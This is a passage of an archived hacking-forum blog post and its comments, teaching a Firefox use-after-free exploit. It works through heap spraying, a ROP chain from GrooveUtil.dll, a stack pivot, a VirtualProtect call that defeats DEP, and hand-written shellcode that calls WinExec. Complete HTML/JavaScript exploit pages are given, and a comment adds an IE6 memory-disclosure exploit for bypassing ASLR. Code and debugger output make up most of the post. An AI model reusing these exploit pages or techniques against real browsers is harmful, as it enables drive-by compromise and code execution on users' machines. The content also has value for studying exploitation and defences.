+0C100098  0C 0C 0C 0C 0C 0C 0C     .......
+--- -- --
+--- -- --
+--- -- --</pre>
+</div>So we need to place the first gadget address at 0C100018: 0D 01 0E 1E and change the 0C100000: 01 01 02 01 with address to (address of offset to the address of next gadget[ XCHG EAX,ESP;ret ])-8 that is at &quot;%u 0107%u 0108&quot; if at 0x0C100000 has 0x0C100004 <br />
+<br />
+Following code section:<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:252px;">var heap = unescape(
+/* ROP : */			&quot;% u0004%u 0c10&quot;
+					+&quot;% u0103%u 0104&quot;
+					+&quot;%u 0105% u0106&quot;
+					+&quot;%u BE51%u 6623&quot;	// XCHG EAX,ESP;ret
+					+&quot;%u 0109%u 010a&quot;
+					+&quot;% u010b%u 010c&quot;
+					+&quot;%u 5B33% u661C&quot;	// :GR469A~1.DLL
+									//	8B01             MOV EAX,DWORD PTR DS:[ECX]
+									//	FF50 08          CALL DWORD PTR DS:[EAX+8]
+					+&quot;% u010f% u0111&quot;
+					+&quot;%u 0112% u0113&quot;
+					+&quot;%u 0114%u 0115&quot;
+					+&quot;%u 0116%u 0117&quot;
+					+&quot;%u 0118% u0119&quot;
+					+&quot;% u011a%u 011b&quot;
+					+&quot;%u 011c%u 011d&quot;
+					+&quot;%u 011e%u 011f&quot;
+					)</pre>
+</div>It will result in loading our inted value into ESP register as following registers dump shows:<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:132px;">EAX 0029DF08
+ECX 0C100000
+EDX 03D19160
+EBX 048C0124
+ESP 0C100008
+EBP 0029E118
+ESI 804B0002
+EDI 80000000
+EIP 01040103</pre>
+</div>And this will result into our heap block transformed into stack as shown below:<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:372px;">0C100000   0C100004
+0C100004   01040103
+0C100008   01060105
+0C10000C   6623BE51  GR469A~1.6623BE51
+0C100010   010A0109
+0C100014   010C010B  firefox.010C010B
+0C100018   661C5B33  GR469A~1.661C5B33
+0C10001C   0111010F  firefox.0111010F
+0C100020   01130112  firefox.01130112
+0C100024   01150114  firefox.01150114
+0C100028   01170116  firefox.01170116
+0C10002C   01190118
+0C100030   011B011A
+0C100034   011D011C
+0C100038   011F011E
+0C10003C   90909090
+0C100040   90909090
+0C100044   CCCCCCCC
+0C100048   CCCCCCCC
+0C10004C   CCCCBBBB
+0C100050   EEEEDDDD
+0C100054   636C6163
+0C100058   6578652E
+0C10005C   CCCC0000
+0C100060   0C0C0C0C
+0C100064   0C0C0C0C
+0C100068   0C0C0C0C
+0C10006C   0C0C0C0C
+0C100070   0C0C0C0C
+0C100074   0C0C0C0C
+0C100078   0C0C0C0C
+0C10007C   0C0C0C0C
+0C100080   0C0C0C0C
+0C100084   0C0C0C0C
+0C100088   0C0C0C0C
+0C10008C   0C0C0C0C
+0C100090   0C0C0C0C
+0C100094   0C0C0C0C
+0C100098   0C0C0C0C
+0C10009C   0C0C0C0C
+0C1000A0   0C0C0C0C
+0C1000A4   0C0C0C0C
+------
+------
+------</pre>
+</div>First phase of our mission is now complete with successful stack pivot, so the next return instruction will land on the address in our stack (our heap block).<br />
+<br />
+Now next phase is to get a pointer to the kernel32.VirtualProtect function and put its arguments on our stack to bypass the DEP.<br />
+<br />
+The address to VirtualProtect will follow its arguments, it takes 4 argumenst, the first argument is the address to the first byte of the shellcode, the second argument is the size of the shellcode block; this can be any dword number but atleast the size of shellcode, 3rd argument is the FLAG the value must be 0x00000040 to set the attribute of memory page contaning shellcode as PAGE_READ_WRITE_EXECUTE. 4rth argument is the pointer to any writable location where old attribute value will be saved, this will be 0x0c0c0c0c in our case or whatever make sure it should be writable.<br />
+<br />
+The GrooveUtil.dll contains a call to VirtualProtect at : 0x68F2F1DD as:<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:84px;">68F2F1DD   FF15 BC71F668    CALL DWORD PTR DS:[&lt;&amp;KERNEL32.VirtualPro&gt;; kernel32.VirtualProtect
+68F2F1E3   8BC6             MOV EAX,ESI
+68F2F1E5   5E               POP ESI
+68F2F1E6   C9               LEAVE
+68F2F1E7   C2 0400          RETN 4</pre>
+</div>We need to fix certain things on our stack prior to call to VirtualProtect.<br />
+<br />
+<br />
+POP ESI<br />
+LEAVE<br />
+RETN 4<br />
+<br />
+<br />
+The instruction that will cause trouble is LEAVE it fixes the stack by dissolving the stack frame. The stack frame is the block between ESP and EBP, and until now the EBP register points to an address that will make us lose our stack once again, so the EBP must contain an address just before the start of shellcode. <br />
+<br />
+Now we have the following code:<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:372px;">&lt;html&gt;
+&lt;head&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+&lt;object id=&quot;d&quot; &gt;&lt;/object&gt;
+&lt;script&gt;
+
+function ignite()	{
+	var e=document.getElementById(&quot;d&quot;);
+	e.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0);
+	
+	var vftable = unescape(&quot;\x00&#65533; c10&quot;);
+	// ROP using GrooveUtil.dll :
+	var heap = unescape(&quot;%u 0004%u 0c10&quot;
+					+&quot;%u BCBB%u 68F1&quot;	//POP EDI; POP EBX; POP ESI; RETN
+					+&quot;%u 0105%u 0106&quot;	//
+					+&quot;%u BE51%u 6623&quot;	// XCHG EAX,ESP;ret
+					+&quot;%u 0030%u 0c10&quot; //
+					+&quot;%u 7C2A%u 68F0&quot;	// POP EDI; POP EBP; RETN
+
+
+					+&quot;%u 5B33%u 661C&quot;	// :GR469A~1.DLL
+									//	8B01             MOV EAX,DWORD PTR DS:[ECX]
+									//	FF50 08          CALL DWORD PTR DS:[EAX+8]
+					+&quot;% u0030% u0c10&quot;	// will be popped in ebp
+					+&quot;%u F1DD% u68F2&quot;	// Pointer to Virtual Protect
+					+&quot;% u0030% u0c10&quot;		// Base Address of Shellcode
+					+&quot;% u9000% u0000&quot;		// Size of the Page, you can adjust it
+					+&quot;%u 0040% u0000&quot;		// PAGE_EXECUTE_READ_WRITE
+					+&quot;% u0c0c%u 0c0c&quot;		// Writable Location for preserving old attributes
+					+&quot;%u 0038%u 0c10&quot;		// will be popped in esi
+					)
+/* Shellcode : */	+unescape(&quot;%u 9090%u 9090&quot;+&quot;% u9090% u9090&quot;
+					+&quot;%u CCCC% uCCCC% uCCCC% uCCCC&quot;
+					+&quot;%u BBBB%u CCCC%u DDDD%u EEEE&quot;
+/* command: */		+&quot;% u6163% u636c% u652e% u6578% u0000% ucccc&quot;	// calc.exe
+					);
+
+		var vtable = unescape(&quot;%u 0c0c% u0c0c&quot;);
+        while(vtable.length &lt; 0x10000) {vtable += vtable;}
+        var heapblock = heap+vtable.substring(0,0x10000/2-heap.length*2);
+        while (heapblock.length&lt;0x80000) {heapblock += heap+heapblock;}
+		var finalspray = heapblock.substring(0,0x80000 - heap.length - 0x24/2 - 0x4/2 - 0x2/2);
+        var spray = new Array()
+        for (var iter=0;iter&lt;0x100;iter++){
+           spray[iter] = finalspray+heap;
+        }
+	e.data=&quot;&quot;;
+}
+&lt;/script&gt;
+&lt;input type=button value=&quot;Ignite&quot; onclick=&quot;ignite()&quot; /&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+</div>And it will result into the successful DEP bypass and EIP now lands on our shellcode but the debuggerbreak is called as 0xcc instruction is countered.<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:132px;">EAX 0C100030
+ECX 0C0FFFDC
+EDX 770264F4 ntdll.KiFastSystemCallRet
+EBX 6623BE51 GR469A~1.6623BE51
+ESP 0C10003C
+EBP 0C0C0C0C
+ESI 0C100038
+EDI 661C5B33 GR469A~1.661C5B33
+EIP 0C100041</pre>
+</div>Now comes the next phase of our mission, the shellcode formation. We have two registers containing addresses within GR469A~1.dll<br />
+<br />
+<br />
+EBX 6623BE51 GR469A~1.6623BE51<br />
+EDI 661C5B33 GR469A~1.661C5B33<br />
+<br />
+<br />
+We need to find any call to any Kernel32.dll export function and then we'll make EAX register to point to the kernel32 export, now we can add or subtract the proper offset (These offsets are OS dependent you may need to calculate in ur own cases) to make make EAX point to kernel32.WinExec function, then we'll push the arguments, it takes two arguments, first pointer determines whether the window is shown for executed command or not and second argument is the pointer to the command line you want to execute. <br />
+<br />
+Following instructions will work for us:<br />
+as EDI contains an address inside the dll we need to fix it by adding an offset to make it point to the location where address of export Kernel32.dll is located.<br />
+<br />
+81C7 6D980700 ADD EDI,7986D<br />
+<br />
+Following will be the javascript unicode representation for it:<br />
+<br />
+&quot;% uC781%u 986D%u 0007&quot;<br />
+<br />
+Remember interchange the bytes in pair, if the number of bytes is odd then the begining of last pair can be made to a nop 90.<br />
+Then we will take the address of Kernel32 address into EAX register from pointer to pointer [EDI]:<br />
+<br />
+8B07 MOV EAX,DWORD PTR DS:[EDI]<br />
+<br />
+this will yield &quot;%u 078B&quot; The EAX now contains the address of &quot;Kernel32.WaitForSingleObject&quot;.<br />
+<br />
+0004EFA0 WaitForSingleObject<br />
+<br />
+The RVA of WinExec is as follows:<br />
+<br />
+0008E695 WinExec<br />
+<br />
+Now we need to calculate the offset:<br />
+0008E695 - 0004EFA0 = 3F6F5<br />
+<br />
+So we need to add EAX + 3F6F5 to make EAX point to WinExec.<br />
+<br />
+05 F5F60300 ADD EAX,3F6F5<br />
+<br />
+In javascript it will be:<br />
+<br />
+&quot;%u F505% u03F6 %u 9000&quot;<br />
+<br />
+Then we'll push 5 as an argument to WinExec.<br />
+<br />
+6A 05 PUSH 5<br />
+<br />
+This becomes<br />
+<br />
+&quot;%u 056A&quot;<br />
+5 means window will be shown.<br />
+<br />
+Then we have ecx pointing to somewhere in our heap block.<br />
+<br />
+ECX = 0x0C0FFFDC<br />
+<br />
+We need to fix it also to make it to point to the command to be executed by adding 0x8E it will point to calc.exe.<br />
+<br />
+81C1 8E000000 ADD ECX,8E<br />
+<br />
+Its javascript block will be:<br />
+<br />
+&quot;%u C181% u008E% u0000&quot;<br />
+<br />
+and push ecx on stack<br />
+<br />
+51 PUSH ECX<br />
+<br />
+Its javascript will be<br />
+&quot;%u 9051&quot;<br />
+<br />
+And now the jackpot :<br />
+FFD0 CALL EAX<br />
+<br />
+&quot;%u D0FF&quot;<br />
+<br />
+And with this, you'll hit the jackpot.<br />
+But wait, we also need to terminate the process gently, so copy the eax to some other register like ESI<br />
+then fix ESI to point to TerminateProcess and push its argument it needs the handle to process, the pseudo handle to current process is 0xFFFFFFFF or u need to push -1 and call ESI.<br />
+<br />
+Then the command buffer will also be in same manner<br />
+<br />
+calc.exe<br />
+<br />
+&quot;%u 6163% u636c% u652e%u 6578%u 0000&quot; <br />
+<br />
+Following is the complete exploit code, with handcrafted &amp; compact shellcode, even EMET will also be mitigated itself:<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:372px;">&lt;html&gt;
+&lt;head&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+&lt;object id=&quot;d&quot; &gt;&lt;/object&gt;
+&lt;script&gt;
+
+function ignite()	{
+	var e=document.getElementById(&quot;d&quot;);
+	e.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0);
+	
+	var vftable = unescape(&quot;\x00% u0c10&quot;);
+	// ROP using GrooveUtil.dll :
+	var heap = unescape(&quot;% u0004% u0c10&quot;
+					+&quot;% uBCBB% u68F1&quot;	//POP EDI; POP EBX; POP ESI; RETN
+					+&quot;%u 0105% u0106&quot;	//
+					+&quot;%u BE51%u 6623&quot;	// XCHG EAX,ESP;ret
+					+&quot;%u 0030% u0c10&quot;
+					+&quot;% u7C2A% u68F0&quot;	// POP EDI; POP EBP; RETN
+
+
+					+&quot;% u5B33% u661C&quot;	// :GR469A~1.DLL
+									//	8B01             MOV EAX,DWORD PTR DS:[ECX]
+									//	FF50 08          CALL DWORD PTR DS:[EAX+8]
+					+&quot;% u0030% u0c10&quot;	// will be popped in ebp
+					+&quot;% uF1DD% u68F2&quot;	// Pointer to Virtual Protect
+					+&quot;% u0030% u0c10&quot;		// Base Address of Shellcode
+					+&quot;% u9000% u0000&quot;		// Size of the Page, you can adjust it
+					+&quot;% u0040% u0000&quot;		// PAGE_EXECUTE_READ_WRITE
+					+&quot;% u0c0c% u0c0c&quot;		// Writable Location for preserving old attributes
+					+&quot;% u0038% u0c10&quot;		// will be popped in esi
+					)
+					+unescape(&quot;% u9090% u9090&quot;+&quot;% u9090% u9090&quot;
+					+&quot;% uC781% u986D%u 0007&quot;	//81C7 6D980700    ADD EDI,7986D
+					+&quot;% u078B&quot;	//8B07             MOV EAX,DWORD PTR DS:[EDI]
+					+&quot;% uF505%u 03F6% u9000&quot;	//05 F5F60300      ADD EAX,3F6F5;90 NOP
+					+&quot;% u9090&quot;
+					+&quot;% u056A&quot;	//6A 05            PUSH 5
+					+&quot;% uC181% u008E% u0000&quot;	//81C1 8E000000    ADD ECX,8E
+					+&quot;% u9051&quot;	//51    PUSH ECX; 90 NOP
+					+&quot;% uF08B&quot;	//8BF0             MOV ESI,EAX
+					+&quot;% uD0FF&quot;	//FFD0             CALL EAX
+//					+&quot;% ucccc&quot;
+					+&quot;%u EE81% u95Fa% u0004&quot;//81EE FA950400    SUB ESI,495FA
+					+&quot;%u FF6A&quot;	//6A FF            PUSH -1
+					+&quot;%u D6FF&quot;	//FFD6             CALL ESI
+					+&quot;%u CCCC&quot;
+/* command: */		+&quot;% u6163% u636c% u652e% u6578% u0000% ucccc&quot;
+					);
+
+		var vtable = unescape(&quot;% u0c0c%u 0c0c&quot;);
+        while(vtable.length &lt; 0x10000) {vtable += vtable;}
+        var heapblock = heap+vtable.substring(0,0x10000/2-heap.length*2);
+        while (heapblock.length&lt;0x80000) {heapblock += heap+heapblock;}
+		var finalspray = heapblock.substring(0,0x80000 - heap.length - 0x24/2 - 0x4/2 - 0x2/2);
+        var spray = new Array()
+        for (var iter=0;iter&lt;0x100;iter++){
+            spray[iter] = finalspray+heap;
+        }
+	e.data=&quot;&quot;;
+}
+&lt;/script&gt;
+&lt;input type=button value=&quot;Ignite&quot; onclick=&quot;ignite()&quot; /&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+</div>Note: Remember to remove the spaces around % and u.<br />
+<br />
+Thanx<br />
+...&quot;vinnu&quot;
+
+					
+				</blockquote>
+			</div>
+				
+
+
+				<div class="blogcontrol fly">
+					
+				</div>
+
+				<div class="blogmeta">
+					
+
+					
+					<div class="tags" id="blogtagcontainer_242">
+							Tags:
+							<span id="blogtaglist_242">
+								
+								<a href="blog9d51.html?u=61&amp;tag=aslr+dep+bypass">aslr dep bypass</a>, 
+	
+
+	
+		<a href="blog1b96.html?u=61&amp;tag=aslr+evasion">aslr evasion</a>
+								
+							</span>
+							
+								<span id="blogtagmenu_242"><a href="threadtag90f4.html?do=manage&amp;contenttype=vBBlog_BlogEntry&amp;contentid=242"><img src="images/misc/blog/tag_edit.html" border="0" class="inlineimg" id="blogtag_242" alt="Add / Edit Tags" /></a></span>
+							
+					</div>
+					
+				
+					
+					<dl class="blogcategory stats">
+						<dt class="shade">Categories</dt>
+						<dd>
+
+	
+		<a href="blog8537.html?u=61&amp;blogcategoryid=-1">Uncategorized</a>
+	
+</dd>
+					</dl>
+					
+				</div>
+				<ul class="entrycontrols">
+					
+					
+					
+					
+					
+				</ul>
+
+		</div>
+	</div>
+
+</div>
+
+<div id="navlinks">
+	<!-- top navlinks -->
+	
+		&laquo; <a href="blog5b81.html?b=242&amp;goto=prev">Prev</a>
+		&nbsp;&nbsp;&nbsp;
+	
+	<a href="blogf35f.html?u=61">Main</a>
+		
+			&nbsp;&nbsp;&nbsp;
+			<a href="blogd53c.html?b=242&amp;goto=next">Next</a> &raquo;
+		
+	<!-- end top navlinks -->
+</div>
+
+
+
+
+<!-- lightbox scripts -->
+	<script type="text/javascript" src="clientscript/vbulletin_lightbox6719.html?v=421"></script>
+	<script type="text/javascript">
+	<!--
+	vBulletin.register_control("vB_Lightbox_Container", "entry242", 1);
+	//-->
+	</script>
+<!-- / lightbox scripts -->
+
+
+
+
+<h2 id="comments_heading" class="commentsheader"><a name="comments"></a>Comments</h2>
+
+<div id="above_comments" class="floatcontainer">
+	
+	
+		
+</div>
+
+<form action="../external.html?link=http://garage4hackers.com/blog_inlinemod.php?b=242" method="post" id="commentform" class="block">
+	
+	<ol id="message_list" class="list_no_decoration">
+		<li class="postbit postbit-lite postcontainer " id="comment_260">
+	<a name="comment260"></a>
+	
+		
+			
+				<a href="member5626.html?u=2" class="avatarlink"><img src="BondLogo2821.jpg?u=2&amp;dateline=1278296558&amp;type=thumb" alt="b0nd's Avatar"/></a>
+			
+		
+	
+	
+	
+	<div class="commenthead">
+	<div class="postbithead">
+		<label for="comment_imod_checkbox_260">
+		
+			<a href="member5626.html?u=2" class="username">b0nd</a>
+		
+		-
+		<span class="postdate">09-21-2011 <span class="time">03:35 PM</span></span>
+		</label>
+	
+	<div class="postbitfoot floatcontainer">
+		<ul class="postcontrols">
+			
+			
+			
+		</ul>
+	</div>
+	</div>
+	</div>
+	<div class="content">
+		<div id="comment_text_260">
+			<blockquote class="posttext restore">
+				... and the knowledge is overflowing <img src="images/smilies/smile.html" border="0" alt="" title="Smile" class="inlineimg" /> keep sharing bro! Thanks a lot!
+			</blockquote>
+		</div>
+		<div class="commentfoot floatcontainer">
+			
+		</div>
+	</div>
+	
+	
+	<script type="text/javascript">
+	<!--
+	vBulletin.register_control("vB_QuickEdit", "260");
+	//-->
+	</script>
+</li><li class="postbit postbit-lite postcontainer " id="comment_292">
+	<a name="comment292"></a>
+	
+		
+			<span class="avatarlink"><img src="images/misc/unknown.html" alt="paulhall's Avatar" /></span>
+		
+	
+	
+	
+	<div class="commenthead">
+	<div class="postbithead">
+		<label for="comment_imod_checkbox_292">
+		
+			<span class="username">paulhall</span>
+		
+		-
+		<span class="postdate">10-10-2011 <span class="time">01:27 PM</span></span>
+		</label>
+	
+	<div class="postbitfoot floatcontainer">
+		<ul class="postcontrols">
+			
+			
+			
+		</ul>
+	</div>
+	</div>
+	</div>
+	<div class="content">
+		<div id="comment_text_292">
+			<blockquote class="posttext restore">
+				This is a great technique, its really helpful . And the kind of its explanation you have shared is really appreciable. <br />
+<br />
+<a href="../external.html?link=http://www.citizenshipper.com/hot-shot-loads.php" target="_blank">courier jobs</a>
+			</blockquote>
+		</div>
+		<div class="commentfoot floatcontainer">
+			
+		</div>
+	</div>
+	
+	
+	<script type="text/javascript">
+	<!--
+	vBulletin.register_control("vB_QuickEdit", "292");
+	//-->
+	</script>
+</li><li class="postbit postbit-lite postcontainer " id="comment_293">
+	<a name="comment293"></a>
+	
+		
+			
+				<a href="memberf35f.html?u=61" class="avatarlink"><img src="OgAAAKECRZIQ0CQMht6ocaZhb4RxV7AN8oAwoXnODx3ShEWW6iUkMn-Agi6QXhZHZzoO57xtCO3wfqfigLPcm16fk4IAm1T1UGRi1af5?u=61&amp;dateline=1311230253&amp;type=thumb" alt="&quot;vinnu&quot;'s Avatar"/></a>
+			
+		
+	
+	
+	
+	<div class="commenthead">
+	<div class="postbithead">
+		<label for="comment_imod_checkbox_293">
+		
+			<a href="memberf35f.html?u=61" class="username">&quot;vinnu&quot;</a>
+		
+		-
+		<span class="postdate">10-20-2011 <span class="time">04:25 PM</span></span>
+		</label>
+	
+	<div class="postbitfoot floatcontainer">
+		<ul class="postcontrols">
+			
+			
+			
+		</ul>
+	</div>
+	</div>
+	</div>
+	<div class="content">
+		<div id="comment_text_293">
+			<blockquote class="posttext restore">
+				Namaste<br />
+<br />
+Regarding ASLR following code leaks enough memory block to grab any loaded modules base address. Though the vulnerability is only affecting the IE 6 in win xp, but is a nice example for practice and for practice you can utilize this technique along with ROP to effectively bypass the ASLR+DEP in practice for expertise.<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:372px;">&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;IE 6 Memory disclosure exploit...&quot;vinnu&quot;&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div id=&quot;disc&quot;&gt;&lt;/div&gt;
+&lt;script&gt;
+var limit = 8000;// Above it will crash and may lead to Code Execution.
+var did = document.getElementById(&quot;disc&quot;);
+function discl()	{
+	var buf=&quot;&quot;;
+	var c=&quot;0000&quot;;
+	var d=0x0000;
+	/****************************************************/
+	var a=document.createElement(&quot;select&quot;);
+	var b=a.componentFromPoint(0xff,0xff);
+	/*** Vulnerable code. componentFromPoint() on an
+	unmaterialised object leads to leaking in memory. ***/
+	
+	did.innerHTML+=&quot;&lt;br&gt;Object.length : &quot;+b.length;
+	buf=&quot;&lt;table&gt;&lt;tr&gt;&quot;;
+	for(var i=0;i&lt;limit;i++)	{
+		d = b.charCodeAt(i).toString(16);
+		buf+=&quot;&lt;td&gt;&quot;+c.substring(0,4-d.toString().length)+d+&quot;&lt;/td&gt;&quot;;
+		if(i%16==0){buf+=&quot;&lt;/tr&gt;&lt;tr&gt;&quot;}
+	}buf+=&quot;&lt;/tr&gt;&lt;/table&gt;&quot;;
+	did.innerHTML += buf;
+}
+&lt;/script&gt;
+&lt;input type=button value=&quot;Disclose&quot; onclick=&quot;discl()&quot; /&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+</div>
+			</blockquote>
+		</div>
+		<div class="commentfoot floatcontainer">
+			
+		</div>
+	</div>
+	
+	
+	<script type="text/javascript">
+	<!--
+	vBulletin.register_control("vB_QuickEdit", "293");
+	//-->
+	</script>
+</li><li class="postbit postbit-lite postcontainer " id="comment_294">
+	<a name="comment294"></a>
+	
+		
+			
+				<a href="memberf35f.html?u=61" class="avatarlink"><img src="OgAAAKECRZIQ0CQMht6ocaZhb4RxV7AN8oAwoXnODx3ShEWW6iUkMn-Agi6QXhZHZzoO57xtCO3wfqfigLPcm16fk4IAm1T1UGRi1af5?u=61&amp;dateline=1311230253&amp;type=thumb" alt="&quot;vinnu&quot;'s Avatar"/></a>
+			
+		
+	
+	
+	
+	<div class="commenthead">
+	<div class="postbithead">
+		<label for="comment_imod_checkbox_294">
+		
+			<a href="memberf35f.html?u=61" class="username">&quot;vinnu&quot;</a>
+		
+		-
+		<span class="postdate">10-20-2011 <span class="time">04:26 PM</span></span>
+		</label>
+	
+	<div class="postbitfoot floatcontainer">
+		<ul class="postcontrols">
+			
+			
+			
+		</ul>
+	</div>
+	</div>
+	</div>
+	<div class="content">
+		<div id="comment_text_294">
+			<blockquote class="posttext restore">
+				output looks like :<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:372px;">Object.length : 9879369350050 
+77c2 0000 0003 99a0 0113 c2e3 77c2 0008 0000 b688 0013 042c 001a b060 0003 0008 
+0013 4383 75c5 1334 001c 023f 0000 004b 0000 b688 0013 2038 025b 9f98 0003 0008 
+0000 b688 0013 f2fc 001b b570 0003 0050 7714 e270 0111 e270 0111 b770 0013 0050 
+0013 de08 0013 3700 0113 af78 0003 0050 0013 de08 0013 e270 0111 af78 0003 0050 
+7714 9950 0113 9950 0113 df94 0013 0050 77c2 0000 0003 3240 0113 c2e3 77c2 004a 
+0013 dca4 0013 e7c8 0003 b650 0003 0008 0013 4383 75c5 b34c 001b b5a0 0003 004a 
+0013 de08 0013 c418 0003 b640 0003 0003 0000 b688 0013 0013 0000 714e 75c5 004a 
+7714 2f30 00d5 af78 0003 b600 0003 004a 0000 0000 0000 c380 0003 b510 0003 004a 
+0000 0000 0000 c310 0003 b620 0003 0050 77c2 0018 0000 e270 0111 e3e8 0013 0050 
+77c2 c3e7 77c2 e270 0111 e3d8 0013 0050 0003 e428 0013 e270 0111 e408 0013 0022 
+00ca 013b 000c 0000 0000 0049 0003 3240 0113 b530 0003 b358 0013 0008 0000 0000 
+0000 6d0e 55c0 0014 0000 b6ec 0003 0000 0000 0063 0068 0061 0072 0043 006f 0064 
+0065 0041 0074 0000 0000 0049 0003 0000 0000 b4d0 0003 42eb 75c5 0008 0000 000a 
+0000 442a bf2e 0010 0000 b728 0003 0000 0000 0074 006f 0053 0074 0072 0069 006e 
+0067 0000 0003 0049 0003 0000 0000 b4c0 0003 42eb 75c5 0008 0000 75f4 0003 cfa1 
+8c80 0012 0000 0000 0000 0000 0000 0073 0075 0062 0073 0074 0072 0069 006e 0067 
+0000 7841 0000 0006 0000 75f4 0003 0000 0000 0064 0069 0064 0000 000a 0000 b794 
+0003 75f4 0003 006c 0069 006d 0069 0074 0000 0049 033d e434 0013 b5f0 0003 e3d8 
+0013 0010 0000 0010 0000 7841 0000 0007 0022 0119 000c 3260 75c6 30cc 75c6 334c 
+75c6 0002 0000 aca8 0003 0000 0000 31c0 0113 deac 0013 0000 0aa0 0000 0000 0000 
+0000 0001 0000 0004 0007 0112 000c 0009 0000 0000 0000 e270 0111 c6b0 0003 fd9b 
+ffff 0000 0000 0005 0004 000f 0000 01a0 0003 01a0 0003 0040 0000 0001 0000 0002 
+0007 0001 0000 0188 0003 94a8 0003 0004 0005 01e9 0008 7ff8 75c5 0001 0000 000c 
+0000 9438 0003 000c 0000 0001 0000 001a 0004 01e5 0008 c090 0003 0063 0072 0069 
+0070 0074 0020 002d 0020 0061 006e 006f 006e 0079 006d 006f 0075 0073 0020 0066 
+0075 006e 0063 0074 0069 006f 006e 0000 0000 0000 0000 0000 0000 0000 0000 0000 
+0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 
+0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 
+0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 
+----------------------
+----------------------
+----------------------</pre>
+</div>Likewise disclosing several pointers inside loaded DLLs, which can be used to dynamically build the ROP chain + shellcode.<br />
+<br />
+...&quot;vinnu&quot;
+			</blockquote>
+		</div>
+		<div class="commentfoot floatcontainer">
+			
+		</div>
+	</div>
+	
+	
+	<script type="text/javascript">
+	<!--
+	vBulletin.register_control("vB_QuickEdit", "294");
+	//-->
+	</script>
+</li>
+	</ol>
+	
+
+	<div id="below_comments" class="floatcontainer">
+		
+	</div>
+
+	<input type="hidden" name="s" value="" />
+	<input type="hidden" name="securitytoken" value="guest" />
+	<input type="hidden" name="b" value="242" />
+	<input type="hidden" name="bt" value="" />
+	<input type="hidden" name="url" value="" />
+	<input type="hidden" name="userid" value="61" />
+</form>
+
+
+
+
+
+
+
+
+	
+		<!-- Editor Scripts -->
+<script type="text/javascript">
+<!--
+
+var CKEDITOR_BASEPATH = getBaseUrl() + 'clientscript/ckeditor/';
+
+var ltr = 'left';
+
+
+
+var ignorequotechars = 1;
+var allowbasicbbcode = false;
+
+// vB Phrases
+vbphrase["must_enter_subject"]           = "You must enter a title / subject!";
+vbphrase["message_too_short"]            = "The message you have entered is too short. Please lengthen your message to at least %1$s characters.";
+vbphrase["click_quick_reply_icon"]       = "";
+vbphrase["all_files"]                    = "All Files";
+vbphrase["file_is_too_large"]            = "File is too Large";
+vbphrase["invalid_file"]                 = "Invalid File";
+vbphrase["maximum_number_of_attachments_reached"] = "Maximum number of attachments reached";
+
+//-->
+</script>
+<!-- / Editor Scripts -->
+		<script type="text/javascript" src="clientscript/ckeditor/ckeditor14ad.html?t=A7HG4HT&amp;v=421"></script><script type="text/javascript" src="clientscript/vbulletin_textedit6719.html?v=421"></script>
+	
+<div id="ajax_post_errors" class="hidden">
+	<div class="block">
+		<div class="blockhead floatcontainer">
+			<span class="blockhead_info"><input type="button" class="button" value=" X " id="quick_edit_errors_hide" /></span>
+			<h2>vBulletin Message</h2>
+		</div>
+		<div class="blockbody">
+			<div id="ajax_post_errors_message" class="blockrow">&nbsp;</div>
+		</div>
+		<div class="blockfoot">
+			<a href="#" id="quick_edit_errors_cancel" class="textcontrol">Cancel Changes</a>
+		</div>
+	</div>
+</div>
+	<script type="text/javascript" src="clientscript/blog_quick_edit6719.html?v=421"></script>
+	
+
+
+
+
+	
+
+	<h2 id="trackbacks_heading" class="commentsheader"><a name="trackbacks"></a>Trackbacks</h2>
+
+	<div class="trackbacks_block">
+		<span class="shade">Total Trackbacks</span> 0
+	
+		<div class="shade">
+			<a href="entry9367.html?b=242" title="Trackback URL" class="shade">No other blogs currently reference this blog entry</a>
+		</div>
+	
+
+		
+		
+		<div id="trackbackurl">
+			Trackback URL: <input type="text" value="http://garage4hackers.com/blog_callback.php?b=242" onmouseover="this.select();" />
+		</div>
+		
+	</div>
+
+	
+
+
+<script type="text/javascript">
+<!--
+	vBulletin.register_control("vB_QuickEdit_Blog_Entry", "242");
+    extra = {
+    //
+    };
+
+    extra.userid = "61";
+
+    vBulletin.register_control("vB_AJAX_TagEditor", "vBBlog_BlogEntry", "242", "blog", extra);
+//-->
+</script>
+<script type="text/javascript" src="clientscript/vbulletin_menu6719.html?v=421"></script>
+<script type="text/javascript" src="clientscript/vbulletin_ajax_tageditor6719.html?v=421"></script>
+			<!-- End main content -->
+		        </div>
+		</div>
+	</div>
+	<div id="sidebar_container"><h6 class="actionbutton_container">
+	
+		<a class="pagetitleinfo textcontrol" href="register.html" rel="nofollow"><span>+</span> Create Blog</a>
+	
+	</h6>
+
+<div id="blog_user_sidebar">
+	
+
+	<div class="block mainblock">
+		<div class="blocksubhead"><a class="username offline" href="memberf35f.html?u=61">&quot;vinnu&quot;</a></div>
